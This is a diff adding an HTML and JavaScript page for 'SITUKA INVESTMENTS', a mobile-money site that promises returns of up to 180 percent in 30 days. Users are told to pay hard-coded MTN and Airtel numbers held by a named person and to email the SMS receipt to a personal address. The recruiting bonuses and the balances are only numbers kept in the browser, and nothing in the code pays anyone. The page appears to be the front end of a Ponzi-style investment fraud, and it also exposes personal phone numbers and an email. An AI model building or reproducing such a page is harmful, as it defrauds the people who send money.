@@ -1,1 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>SITUKA INVESTMENTS</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif;-webkit-tap-highlight-color:transparent}
+body{background:linear-gradient(135deg,#0a0a1a 0%,#1a1a2e 100%);color:#fff;min-height:100vh;max-width:480px;margin:0 auto;padding-bottom:90px}
+.screen{display:none}.screen.active{display:block;animation:fadeIn 0.3s}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.header{padding:20px;text-align:center;background:linear-gradient(135deg,#00d4ff 0%,#7b2cbf 100%);font-weight:900;font-size:22px;color:#fff;box-shadow:0 4px 20px rgba(0,212,255,0.3)}
+.btn{width:90%;margin:12px auto;display:block;padding:16px;background:linear-gradient(135deg,#00d4ff 0%,#7b2cbf 100%);border:0;border-radius:14px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;box-shadow:0 4px 15px rgba(0,212,255,0.3)}
+.btn-outline{background:transparent;border:2px solid #00d4ff;color:#00d4ff}
+.btn-success{background:linear-gradient(135deg,#00ff88,#00cc66)}
+.btn-email{background:linear-gradient(135deg,#ff6b00,#ff0044)}
+.btn-invite{background:linear-gradient(135deg,#ffaa00,#ff6600)}
+input,select,textarea{width:90%;margin:10px auto;display:block;padding:15px;background:#1e1e2e;border:2px solid #2a2a3a;border-radius:12px;color:#fff;font-size:16px}
+.label{font-size:12px;color:#00d4ff;margin-left:5%;display:block;margin-bottom:5px;font-weight:600}
+.card{background:#1e1e2e;margin:14px;border-radius:20px;padding:20px;border:1px solid #2a2a3a;box-shadow:0 4px 20px rgba(0,0,0,0.3)}
+.invest-card{background:linear-gradient(135deg,#1e1e2e 0%,#25253a 100%);border:2px solid #00d4ff;margin:14px;border-radius:20px;padding:20px;text-align:center;cursor:pointer;transition:0.3s}
+.invest-card.selected{border-color:#00ff88;background:linear-gradient(135deg,#00ff8820 0%,#00cc6620 100%)}
+.payment-btn{flex:1;padding:18px;border-radius:16px;text-align:center;font-weight:800;cursor:pointer;border:3px solid transparent;font-size:16px;transition:0.2s}
+.payment-btn.selected{border-color:#00ff88;box-shadow:0 0 15px rgba(0,255,136,0.5)}
+.invest-amount{font-size:32px;font-weight:900;color:#00ff88}
+.invest-return{font-size:18px;color:#00d4ff;margin:8px 0}
+.balance-box{text-align:center;padding:25px 20px}
+.balance-amount{font-size:40px;font-weight:900;background:linear-gradient(135deg,#00ff88,#00d4ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.payment-icons{display:flex;gap:15px;width:90%;margin:15px auto}
+.mtn-btn{background:#ffcc00;color:#000}.airtel-btn{background:#ff0044;color:#fff}
+.payment-number-box{background:#25253a;border:2px dashed #00ff88;padding:20px;border-radius:16px;margin:15px 0;text-align:center}
+.payment-number{font-size:28px;font-weight:900;color:#00ff88}
+.steps{font-size:13px;color:#aaa;text-align:left;margin-top:10px;line-height:1.6;background:#1a1a2e;padding:12px;border-radius:10px}
+.brand-hero{padding:30px 20px;text-align:center}
+.brand-icon{font-size:60px;margin-bottom:10px}
+.brand-name{font-size:28px;font-weight:900;background:linear-gradient(135deg,#00d4ff,#7b2cbf);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.small{font-size:11px;color:#888;text-align:center;margin-top:8px}
+.phone-group{display:flex;width:90%;margin:10px auto;gap:8px}
+.phone-group select{width:35%}.phone-group input{width:65%}
+.bottom-nav{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;display:none;background:#1a1a2e;border-top:2px solid #00d4ff;padding:10px 0;z-index:100}
+.bottom-nav.show{display:flex}
+.nav-btn{flex:1;text-align:center;font-size:11px;color:#666;cursor:pointer}
+.nav-btn.icon{font-size:22px;display:block;margin-bottom:3px}
+.nav-btn.active{color:#00d4ff}
+.note-danger{font-size:12px;color:#ff0044;text-align:center;padding:10px;background:#ff004410;border-radius:10px;margin:10px;font-weight:700}
+.note-success{font-size:12px;color:#00ff88;text-align:center;padding:10px;background:#00ff8810;border-radius:10px;margin:10px;font-weight:700}
+.status-waiting{color:#ffaa00}
+.status-paid{color:#00ff88;font-weight:800}
+.welcome{padding:15px;text-align:center;background:#25253a;margin:10px;border-radius:12px}
+.record-item{background:#25253a;padding:12px;border-radius:10px;margin-bottom:10px;border-left:3px solid #00d4ff}
+.invite-box{background:#25253a;padding:15px;border-radius:12px;margin:10px;text-align:center}
+.invite-link{background:#1a1a2e;padding:12px;border-radius:8px;color:#00ff88;font-size:12px;word-break:break-all}
+</style>
+</head>
+<body>
 
+<!-- LOGIN / SIGNUP -->
+<div id="login" class="screen active">
+  <div class="header">SITUKA INVESTMENTS</div>
+  <div class="brand-hero"><div class="brand-icon">💰</div><div class="brand-name">SITUKA</div><div style="color:#888">Invest & Earn in 30 Days</div></div>
+
+  <div class="note-danger">⚠️ Use EXACT Name + Phone on Mobile Money. This is where we send your money + invite bonuses after 30 days.</div>
+
+  <!-- CREATE ACCOUNT FIRST -->
+  <div id="signupform">
+    <div style="text-align:center;font-weight:800;margin:10px;color:#00ff88">CREATE NEW ACCOUNT</div>
+    <span class="label">Full Name - As on Mobile Money</span><input id="fullname" placeholder="e.g. JOHN DOE">
+    <span class="label">🌍 Phone Number - For Payout</span>
+    <div class="phone-group">
+      <select><option>+256</option></select>
+      <input id="phone" placeholder="7xxxxxxxx" maxlength="9">
+    </div>
+    <span class="label">Invite Code - Optional</span><input id="invitecode" placeholder="e.g. @JOHNDOE">
+    <button class="btn" onclick="createAccount()">✨ Create Account & Get Started</button>
+  </div>
+
+  <div style="text-align:center;margin:15px 0;color:#666">----------- ALREADY HAVE ACCOUNT? -----------</div>
+
+  <!-- LOGIN BELOW -->
+  <div id="loginform">
+    <div style="text-align:center;font-weight:800;margin:10px;color:#00d4ff">LOGIN</div>
+    <span class="label">Full Name</span><input id="loginname" placeholder="Enter name used to register">
+    <span class="label">Phone Number</span>
+    <div class="phone-group">
+      <select><option>+256</option></select>
+      <input id="loginphone" placeholder="7xxxxxxxx" maxlength="9">
+    </div>
+    <button class="btn btn-outline" onclick="loginExisting()">🔑 Login to My Account</button>
+  </div>
+
+  <div class="small">Your account + records are saved on this device</div>
+</div>
+
+<!-- INVESTMENTS PAGE -->
+<div id="investments" class="screen">
+  <div class="header">Choose Package</div>
+  <div class="welcome">
+    <div>Welcome, <span id="welcomeName" style="font-weight:800;color:#00ff88"></span></div>
+    <div style="font-size:11px;color:#aaa">Payout Number: <span id="welcomePhone"></span></div>
+  </div>
+  <div class="balance-box">
+    <div style="color:#888;font-size:13px">Your Balance</div>
+    <div class="balance-amount">UGX <span id="balance">0</span></div>
+  </div>
+
+  <div class="invest-card" onclick="selectPackage(15000,40000,30,this)">
+    <div style="font-weight:800;font-size:18px">PACKAGE 1</div>
+    <div class="invest-amount">UGX 15,000</div>
+    <div class="invest-return">Get <span class="profit">UGX 40,000</span></div>
+    <div class="invest-days">After 30 Days | Profit: UGX 25,000</div>
+  </div>
+
+  <div class="invest-card" onclick="selectPackage(20000,56000,30,this)">
+    <div style="font-weight:800;font-size:18px">PACKAGE 2</div>
+    <div class="invest-amount">UGX 20,000</div>
+    <div class="invest-return">Get <span class="profit">UGX 56,000</span></div>
+    <div class="invest-days">After 30 Days | Profit: UGX 36,000</div>
+  </div>
+
+  <div class="invest-card" onclick="selectPackage(40000,70000,30,this)">
+    <div style="font-weight:800;font-size:18px">PACKAGE 3</div>
+    <div class="invest-amount">UGX 40,000</div>
+    <div class="invest-return">Get <span class="profit">UGX 70,000</span></div>
+    <div class="invest-days">After 30 Days | Profit: UGX 30,000</div>
+  </div>
+
+  <button class="btn btn-success" id="investBtn" onclick="goToPayment()">🚀 Select a Package</button>
+</div>
+
+<!-- PAYMENT PAGE -->
+<div id="payment" class="screen">
+  <div class="header"><span style="position:absolute;left:15px;top:50%;transform:translateY(-50%);font-size:26px;cursor:pointer" onclick="showScreen('investments')">←</span>Complete Payment</div>
+  <div class="card">
+    <div style="text-align:center;margin-bottom:15px">
+      <div style="font-size:14px;color:#888">You Selected</div>
+      <div style="font-size:24px;font-weight:900;color:#00ff88" id="selectedpackage">UGX 0</div>
+      <div style="font-size:14px;color:#00d4ff" id="selectedreturn">Get UGX 0</div>
+    </div>
+    <div class="note-danger">Payout will be sent to: <span id="payoutName"></span> - <span id="payoutPhone"></span> after 30 days</div>
+
+    <div style="font-weight:700;margin-bottom:10px">Step 1: Choose Payment Method</div>
+    <div class="payment-icons">
+      <div class="payment-btn mtn-btn" id="mtnbtn" onclick="showPayment('MTN')">📱 MTN</div>
+      <div class="payment-btn airtel-btn" id="airtelbtn" onclick="showPayment('Airtel')">📱 AIRTEL</div>
+    </div>
+    <div id="paymentnumberbox" style="display:none"></div>
+
+    <div id="step2" style="display:none">
+      <div style="font-weight:700;margin:15px 0 10px 0">Step 2: Submit Payment Proof</div>
+      <div class="steps">
+        1. Pay manually to the number above<br>
+        2. Copy the SMS you received from MTN/Airtel<br>
+        3. Tap button below to open Email and paste it<br>
+        4. Payout sent to your registered number after 30 days
+      </div>
+      <button class="btn btn-email" onclick="sendToEmail()">📧 Submit Payment Proof</button>
+    </div>
+  </div>
+</div>
+
+<!-- DASHBOARD -->
+<div id="dashboard" class="screen">
+  <div class="header">Dashboard</div>
+  <div class="welcome">
+    <div>Account: <span id="dashName" style="font-weight:800;color:#00ff88"></span></div>
+    <div style="font-size:11px;color:#aaa">Payout to: <span id="dashPhone"></span></div>
+  </div>
+  <div class="balance-box">
+    <div style="color:#888;font-size:13px">Available Balance</div>
+    <div class="balance-amount">UGX <span id="dbalance">0</span></div>
+  </div>
+
+  <div class="invite-box">
+    <div style="font-weight:800;margin-bottom:8px">💰 INVITE & EARN UGX 3,000</div>
+    <div style="font-size:12px;color:#aaa;margin-bottom:10px">Share your link. You get 3000 instantly when someone joins</div>
+    <div class="invite-link" id="inviteLink"></div>
+    <button class="btn btn-invite" onclick="copyInvite()">📋 Copy Invite Link</button>
+  </div>
+
+  <div class="card">
+    <div style="font-weight:700;margin-bottom:10px">📊 My Investments</div>
+    <div id="activeinvest">No investments yet</div>
+  </div>
+  <div class="card"><div style="font-weight:700;margin-bottom:10px">📋 All Records</div><div id="history">No records yet</div></div>
+  <button class="btn btn-outline" onclick="logout()">🚪 Logout</button>
+</div>
+
+<!-- BOTTOM NAV -->
+<div class="bottom-nav" id="bottomnav">
+  <div class="nav-btn active" onclick="showScreen('investments')"><span class="nav-btn icon">📦</span>Packages</div>
+  <div class="nav-btn" onclick="showScreen('dashboard')"><span class="nav-btn icon">🏠</span>Dashboard</div>
+</div>
+
+<script>
+const MTN_NUMBER = "0788417769";
+const AIRTEL_NUMBER = "0743830346";
+const ADMIN_ACCOUNT_NAME = "lubinga Alosious";
+const ADMIN_EMAIL = "jadacard23@outlook.com";
+const PAYOUT_DAYS = 30;
+const INVITE_BONUS = 3000;
+const SITE_URL = "https://jadacard.github.io/JADA-CARD-admin-1/";
+
+let currentUser = null;let currentUserId = null;let selectedPackage = null;let selectedPaymentMethod = '';
+
+function showScreen(id){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  document.querySelectorAll('.nav-btn').forEach(n=>n.classList.remove('active'));
+  if(id==='investments') document.querySelectorAll('.nav-btn')[0].classList.add('active');
+  if(id==='dashboard') {document.querySelectorAll('.nav-btn')[1].classList.add('active'); loadDashboard();}
+}
+
+function saveLocal(key, data){ localStorage.setItem(key, JSON.stringify(data)); }
+function loadLocal(key){ return JSON.parse(localStorage.getItem(key) || 'null'); }
+function getAllUsers(){ return JSON.parse(localStorage.getItem('situka_all_users') || '[]'); }
+function saveAllUsers(arr){ localStorage.setItem('situka_all_users', JSON.stringify(arr)); }
+
+window.createAccount = function(){
+  const name = document.getElementById('fullname').value.trim().toUpperCase();
+  const digits = document.getElementById('phone').value.trim();
+  const inviteCode = document.getElementById('invitecode').value.trim();
+  if(!name ||!digits || digits.length!==9) return alert('Fill Name and 9 digit Phone');
+  const phone = "+256" + digits;
+  currentUserId = btoa(phone+name).replace(/=/g,'');
+
+  if(loadLocal('situka_user_'+currentUserId)) return alert('Account with this Name + Phone already exists. Please Login');
+
+  currentUser = {
+    name,phone,username:name.replace(/\s/g,''),balance:0,
+    investments:[],invites:[],invitedBy:inviteCode||null
+  };
+
+  // Handle Invite Bonus
+  if(inviteCode){
+    let allUsers = getAllUsers();
+    let inviter = allUsers.find(u => u.username.toUpperCase() === inviteCode.replace('@','').toUpperCase());
+    if(inviter){
+      inviter.balance += INVITE_BONUS;
+      inviter.invites.push({name,phone,date:Date.now()});
+      saveLocal('situka_user_'+btoa(inviter.phone+inviter.name).replace(/=/g,''), inviter);
+      // Email admin about invite
+      window.location.href = `mailto:${ADMIN_EMAIL}?subject=NEW INVITE - ${inviter.name} invited ${name}&body=Inviter: ${inviter.name} - ${inviter.phone}%0ANew User: ${name} - ${phone}%0ABonus: UGX ${INVITE_BONUS} credited to inviter`;
+      alert(`Welcome! You were invited by ${inviter.name}. Inviter got UGX ${INVITE_BONUS} bonus`);
+    }
+  }
+
+  let allUsers = getAllUsers();
+  allUsers.push({name,phone,username:currentUser.username});
+  saveAllUsers(allUsers);
+  saveLocal('situka_user_'+currentUserId, currentUser);
+  saveLocal('situka_last_user', currentUserId);
+
+  document.getElementById('bottomnav').classList.add('show');
+  updateUserInfo(); updateBalance(); showScreen('investments');
+}
+
+window.loginExisting = function(){
+  const name = document.getElementById('loginname').value.trim().toUpperCase();
+  const digits = document.getElementById('loginphone').value.trim();
+  if(!name ||!digits || digits.length!==9) return alert('Enter Name and 9 digit Phone used during registration');
+  const phone = "+256" + digits;
+  currentUserId = btoa(phone+name).replace(/=/g,'');
+  currentUser = loadLocal('situka_user_'+currentUserId);
+  if(!currentUser) return alert('Account not found. Check Name + Phone or Create Account');
+
+  saveLocal('situka_last_user', currentUserId);
+  checkAndCreditPayouts();
+  document.getElementById('bottomnav').classList.add('show');
+  updateUserInfo(); updateBalance(); showScreen('investments');
+}
+
+window.logout = function(){
+  localStorage.removeItem('situka_last_user');
+  currentUser=null; currentUserId=null;
+  document.getElementById('bottomnav').classList.remove('show');
+  showScreen('login');
+  document.getElementById('loginname').value = '';
+  document.getElementById('loginphone').value = '';
+}
+
+function updateUserInfo(){
+  if(currentUser){
+    document.getElementById('welcomeName').textContent = currentUser.name;
+    document.getElementById('welcomePhone').textContent = currentUser.phone;
+    document.getElementById('dashName').textContent = currentUser.name;
+    document.getElementById('dashPhone').textContent = currentUser.phone;
+    document.getElementById('payoutName').textContent = currentUser.name;
+    document.getElementById('payoutPhone').textContent = currentUser.phone;
+    document.getElementById('inviteLink').textContent = SITE_URL + '@' + currentUser.username;
+  }
+}
+
+window.copyInvite = function(){
+  navigator.clipboard.writeText(SITE_URL + '@' + currentUser.username);
+  alert('Invite link copied!');
+}
+
+window.selectPackage = function(amount, totalReturn, days, el){
+  document.querySelectorAll('.invest-card').forEach(c=>c.classList.remove('selected'));
+  el.classList.add('selected');
+  selectedPackage = {amount, totalReturn, days, profit: totalReturn - amount};
+  document.getElementById('investBtn').textContent = `🚀 Invest UGX ${amount.toLocaleString()}`;
+  document.getElementById('selectedpackage').textContent = `UGX ${amount.toLocaleString()}`;
+  document.getElementById('selectedreturn').textContent = `Get UGX ${totalReturn.toLocaleString()} after ${days} days`;
+}
+
+window.goToPayment = function(){
+  if(!selectedPackage) return alert('Please select a package first');
+  selectedPaymentMethod = '';
+  document.getElementById('mtnbtn').classList.remove('selected');
+  document.getElementById('airtelbtn').classList.remove('selected');
+  document.getElementById('paymentnumberbox').style.display='none';
+  document.getElementById('step2').style.display='none';
+  showScreen('payment');
+}
+
+window.showPayment = function(method){
+  selectedPaymentMethod = method;
+  document.getElementById('mtnbtn').classList.remove('selected');
+  document.getElementById('airtelbtn').classList.remove('selected');
+  if(method === 'MTN') document.getElementById('mtnbtn').classList.add('selected');
+  if(method === 'Airtel') document.getElementById('airtelbtn').classList.add('selected');
+  const number = method==='MTN'? MTN_NUMBER : AIRTEL_NUMBER;
+  document.getElementById('paymentnumberbox').style.display='block';
+  document.getElementById('paymentnumberbox').innerHTML = `
+    <div class="payment-number-box">
+      <div>Send UGX ${selectedPackage.amount.toLocaleString()} to:</div>
+      <div class="payment-number">${number}</div>
+      <div>Account Name: ${ADMIN_ACCOUNT_NAME}</div>
+    </div>
+  `;
+  document.getElementById('step2').style.display='block';
+}
+
+window.sendToEmail = function(){
+  if(!selectedPaymentMethod) return alert('Please select payment method first');
+  currentUser.investments.push({...selectedPackage, method:selectedPaymentMethod, date:Date.now(), credited:false});
+  saveLocal('situka_user_'+currentUserId, currentUser);
+  const subject = `SITUKA PAYMENT PROOF - ${currentUser.name} - ${currentUser.phone} - UGX ${selectedPackage.amount.toLocaleString()}`;
+  const body = `NEW INVESTMENT%0A%0AName: ${currentUser.name}%0APayout Phone: ${currentUser.phone}%0AInvested: UGX ${selectedPackage.amount.toLocaleString()}%0AExpected Return: UGX ${selectedPackage.totalReturn.toLocaleString()}%0ADuration: ${selectedPackage.days} Days%0AMethod: ${selectedPaymentMethod}%0AInvestment Date: ${new Date().toLocaleDateString()}%0A%0APaste your MTN/Airtel SMS below:%0A%0A`;
+  window.location.href = `mailto:${ADMIN_EMAIL}?subject=${encodeURIComponent(subject)}&body=${body}`;
+  alert(`Email opened. We will send UGX ${selectedPackage.totalReturn.toLocaleString()} to ${currentUser.phone} after 30 days.`);
+  showScreen('investments');
+}
+
+function checkAndCreditPayouts(){
+  if(!currentUser) return;
+  let changed = false;
+  currentUser.investments.forEach(inv => {
+    if(!inv.credited){
+      const daysPassed = Math.floor((Date.now() - inv.date) / (1000*60*60*24));
+      if(daysPassed >= PAYOUT_DAYS){
+        currentUser.balance += inv.totalReturn;
+        inv.credited = true;
+        changed = true;
+      }
+    }
+  });
+  if(changed) saveLocal('situka_user_'+currentUserId, currentUser);
+}
+
+function loadDashboard(){
+  if(!currentUser) return;
+  checkAndCreditPayouts();
+  updateBalance();
+
+  const investDiv = document.getElementById('activeinvest');
+  const historyDiv = document.getElementById('history');
+
+  if(currentUser.investments.length === 0){
+    investDiv.innerHTML = 'No investments yet';
+    historyDiv.innerHTML = 'No records yet';
+  } else {
+    let allRecords = '';
+    currentUser.investments.slice().reverse().forEach((inv,i) => {
+      const daysPassed = Math.floor((Date.now() - inv.date) / (1000*60*60*24));
+      const daysLeft = PAYOUT_DAYS - daysPassed;
+      let status = inv.credited? `✅ PAID` : daysLeft > 0? `⏳ ${daysLeft} days left` : `✅ Processing`;
+      allRecords += `
+        <div class="record-item">
+          <div style="font-weight:700">Invested: UGX ${inv.amount.toLocaleString()}</div>
+          <div style="color:#00ff88">Return: UGX ${inv.totalReturn.toLocaleString()}</div>
+          <div style="font-size:11px;color:#aaa">Date: ${new Date(inv.date).toLocaleDateString()} | ${status}</div>
+        </div>
+      `;
+    });
+    investDiv.innerHTML = allRecords;
+    historyDiv.innerHTML = `Total Investments: ${currentUser.investments.length}`;
+  }
+}
+
+function updateBalance(){
+  if(currentUser){
+    document.getElementById('balance').textContent = currentUser.balance.toLocaleString();
+    document.getElementById('dbalance').textContent = currentUser.balance.toLocaleString();
+  }
+}
+
+// Auto-load last user + Check invite link in URL
+window.onload = function(){
+  const url = window.location.hash;
+  if(url.includes('@')){
+    document.getElementById('invitecode').value = url.split('@')[1];
+  }
+  const lastUser = loadLocal('situka_last_user');
+  if(lastUser){
+    currentUserId = lastUser;
+    currentUser = loadLocal('situka_user_'+currentUserId);
+    if(currentUser){
+      document.getElementById('bottomnav').classList.add('show');
+      updateUserInfo(); checkAndCreditPayouts(); updateBalance(); showScreen('investments');
+    }
+  }
+}
+</script>
+</body>
+</html>
